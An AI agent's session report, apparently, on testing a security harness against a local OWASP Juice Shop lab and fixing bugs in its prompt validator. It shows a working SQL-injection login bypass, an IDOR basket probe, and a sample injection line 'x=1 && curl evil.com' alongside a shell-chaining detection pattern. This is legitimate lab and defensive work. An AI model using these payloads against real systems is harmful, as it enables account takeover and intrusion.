# Live-target verification report — OWASP Juice Shop

This is the first session in this project's history where the harness was actually run against a live target end-to-end, all the way through a real (if environment-limited) `orchestrator.analyze()` call. Every claim below is something I ran and observed in this session, not carried over from a prior session's prose.

## Setup

Followed the recipe in `HANDOVER.md` (`git clone` → `CYPRESS_INSTALL_BINARY=0 npm install` → `npm run build:server` → placeholder frontend files → `setsid node build/app.js`). Re-verified each step rather than trusting the doc blindly, and it paid off immediately: the documented placeholder image filenames (`JuicyChatBot.png`, `JuicyBot.png`, `JuiceShop_Logo.png`) were stale for this checkout. Re-derived the actual required list from the build output itself (`grep -rhoE "frontend/dist/frontend/..." build/*.js`) and got `ChatbotAvatar.png`/`hackingInstructor.png` instead. Server started clean, all required-file checks passed, confirmed serving real product data.

Registered two real test identities (Alice, Bob) via `/api/Users` and `/rest/user/login`, matching the recipe's identity-registration pattern.

## Three real, independently-confirmed vulnerabilities

**1. SQL injection login bypass — hand-verified.** `{"email":"' OR 1=1--","password":"x"}` against `/rest/user/login` returns a valid **admin** JWT (`role: admin`, `email: admin@juice-sh.op`), where a genuine wrong-password attempt correctly returns "Invalid email or password." Textbook, critical, unambiguous.

**2. IDOR on `/rest/basket/{id}` — hand-verified AND independently confirmed by this project's own Java logic.** Alice's own valid session token retrieves Bob's basket by ID substitution (`GET /rest/basket/7` with Alice's token → 200, `UserId: 26` — Bob's own ID). I gathered all four probes `IdentityCompareLogic.evaluate()` needs (source, candidate, attempt, anon) from this real capture and ran them through the actual compiled Java class from this session's earlier M3 work — **the first time that exact class has ever evaluated real-world data.** Result: `CONFIRMED, confidence=0.91`, matching its own stated decision logic precisely (attempt matches candidate, doesn't match the anon/denied baseline).

**3. CORS misconfiguration — confirmed live by the real, unmodified `cors_validator.py`.** Ran it against a real `GET /rest/products/search` response: `Access-Control-Allow-Origin: *` with no `Vary: Origin`, flagged high/medium.

All three were persisted through real `store.py` calls, and real `chaining.py` detection found the `sqli+idor` chain — **the exact rule added earlier this session** — firing for the first time on genuine data, not a test fixture. Generated a complete, real report via the unmodified `report_generator.py` (included as `JUICE_SHOP_LIVE_REPORT.md` alongside this file).

**One honest discrepancy, not glossed over:** ran the real `sqlmap` binary (installed fresh via `apt-get install sqlmap` — this itself closes a gap the prior session hit and worked around by giving up) live against the login endpoint, active testing deliberately enabled for this disposable, owned target. sqlmap's own heuristics did **not** independently confirm the SQLi (`[WARNING] ... does not appear to be dynamic`). The vulnerability is unambiguously real — proven by hand — but the automated tool missed it in this configuration. Not yet root-caused; flagged as an open item below, not silently smoothed over.

## Three real, previously-undiscovered bugs found by actually running the pipeline

Every one of these was invisible to the 407 unit tests in this repository, because none of them exercised the true, full, live call path with real constructed prompts and real exchange data. This is exactly the gap unit tests structurally cannot close, and exactly what this session's live run was for.

### Bug 1 (crash): `analysis_pipeline.py`'s `_resolve_known_vulnerabilities` had broken imports

`from models import Component` and `from github_advisories import Component as GhaComponent` — **neither name exists.** The real class is `models.ComponentCandidate`; `github_advisories.py` has no `Component` class at all. This crashed with `ImportError` on the very first real agent dispatch that reached this code path. Fixed the import.

**Not yet resolved, flagged clearly:** while fixing this, found that `orchestrator.py` has a **second, independently-implemented, non-identical copy** of `_resolve_known_vulnerabilities`, and both are live-reachable on the same call path (`AnalysisPipeline.run_full_analysis()` calls its own copy internally; `Orchestrator.analyze()` calls its own copy again, afterward, on the same `reports` list). The two copies have real behavioral differences — `orchestrator.py`'s version guards `self.kev_client` differently and reports unverified/skipped component counts as errors; `analysis_pipeline.py`'s version does neither. This means known-vulnerability resolution likely runs twice per exchange, doubling GitHub Advisory/CISA KEV API calls and potentially duplicating findings in the in-memory response (though `store.py`'s fingerprint-based `INSERT OR IGNORE` would likely collapse duplicates at persistence time). I fixed the crash, not the duplication — reconciling two non-identical safety-relevant implementations without fully verifying the merge felt like the wrong tradeoff against remaining session time. **This needs a follow-up session's dedicated attention.**

### Bug 2 (severe — every agent completely non-functional): system prompt validation applied a user-content threat check to trusted, hardcoded text

`prompt_validator.validate_system_prompt()` ran the exact same `blocked_patterns` check used for untrusted user/exchange content against the harness's own static system prompt. The shared `_COMMON_RULES` boilerplate — included in **every one of the 36 specialist agents'** system prompts — contains the literal text `"; so"`, which matched the shell-command-chaining pattern. **This meant no specialist agent could ever complete a single dispatch**, in any session, against any target, for as long as this bug existed — every call would fail prompt validation before any Ollama request was even attempted.

Root cause: the check's own threat model doesn't apply to a hardcoded string. There is no "attacker" for developer-authored, code-reviewed text; a defensive prompt instructing the model what not to do will routinely contain the very words (`execute`, `rm -rf`) and punctuation (semicolons) these patterns look for, without being any kind of injection.

**Fix:** blocked-pattern checking now applies to user prompts only. Added a regression test that constructs a real `AgentManager` (the actual plugin-discovery mechanism, not a guessed-at registry) and validates every real agent's actual constructed system prompt — the test that should have existed from the start.

### Bug 3 (severe — blocked nearly all real HTTP traffic): the shell-chaining pattern was broken in both directions at once

Fixing bug 2 surfaced this immediately: the same pattern, now correctly scoped to user prompts, rejected `Content-Type: application/json; charset=utf-8` — completely standard HTTP syntax, present in nearly every real response.

Root cause, precisely: the pattern `\b(;\s*\w+|&&\s*\w+|\|\|\s*\w+|`\s*\w+)\b` opens with a `\b` word-boundary anchor immediately before operators that are themselves non-word characters. `\b` only fires at a transition between a word character and a non-word character. This produced two simultaneous, confirmed-by-direct-testing failure modes:
- **Over-broad:** the operator directly following a word character (no space) — `json;`, `html;`, `boundary=x;` — creates exactly the transition `\b` needs, so it fired on nearly all real HTTP header syntax.
- **Under-broad:** the operator preceded by a space — `x=1 && curl evil.com`, arguably the more natural way to write a real injection attempt — has no word/non-word transition at that point, so `\b` never matched there at all. **A real attack with a space before the operator would have sailed through undetected**, the whole time.

**Fix:** dropped the leading `\b` (it was the source of both failures, not a useful constraint) and required the operator to be followed by a specific, recognized dangerous command name (`rm`, `curl`, `bash`, `chmod`, etc.), not just any word. Verified against 13 cases — 7 benign (including the real failing HTTP header) and 6 malicious (spaced and unspaced operators, path-prefixed commands, backtick substitution) — before landing it. 10 new regression tests.

## The end state, confirmed live

With all three bugs fixed, ran the real `orchestrator.analyze()` against the real SQLi-bypass exchange with `force_agents=['sqli']`. Result: the audit log shows a genuine `llm.prompt` event (real system/user prompt hashes and lengths — proof the full prompt-construction-and-validation pipeline now completes), followed by a clean `ConnectError` — Ollama genuinely isn't reachable in this sandbox (network policy blocks `ollama.com`; nothing listens on `11434`) — surfaced as an informative `raw_error` on the agent's report, not a crash, not a silent empty result, not a stack trace. **This is the correct, designed failure mode for the one environmental gap this sandbox cannot close, and it only became visible once the three unrelated bugs blocking it were fixed.**

## Full verification

```
cd harness && python3 -m unittest discover -p "test_*.py"   # Ran 407 tests, OK (up from 395 at the start of this session)
```

## What's still open

- **The duplicate `_resolve_known_vulnerabilities` call** (Bug 1's unresolved half) — needs the two implementations reconciled deliberately, not merged under time pressure.
- **The sqlmap discrepancy** — why sqlmap's own heuristics missed a vulnerability proven real by hand. Worth a dedicated investigation (try higher `--level`/`--risk`, inspect whether Juice Shop's bcrypt-hashed password field interferes with sqlmap's standard boolean-pairing technique).
- **Every other pattern in `prompt_validator.py`'s `blocked_patterns` list** was not individually re-audited against real traffic this session — only the one that actually broke was fixed and tested. Given how wrong the fixed one turned out to be, the others deserve the same live-data scrutiny in a future session, not an assumption that "the same bug class was probably only in the one place we happened to hit."
- **Full multi-agent, multi-exchange coverage** — this session verified one exchange with one forced agent reaching the real failure boundary. It did not run the full 36-agent dispatch, the coordinator's routing logic, or a broad crawl-and-analyze pass across Juice Shop's other known vulnerability classes (XSS, business logic, JWT). That remains for whenever a real Ollama backend is available to actually complete the loop.
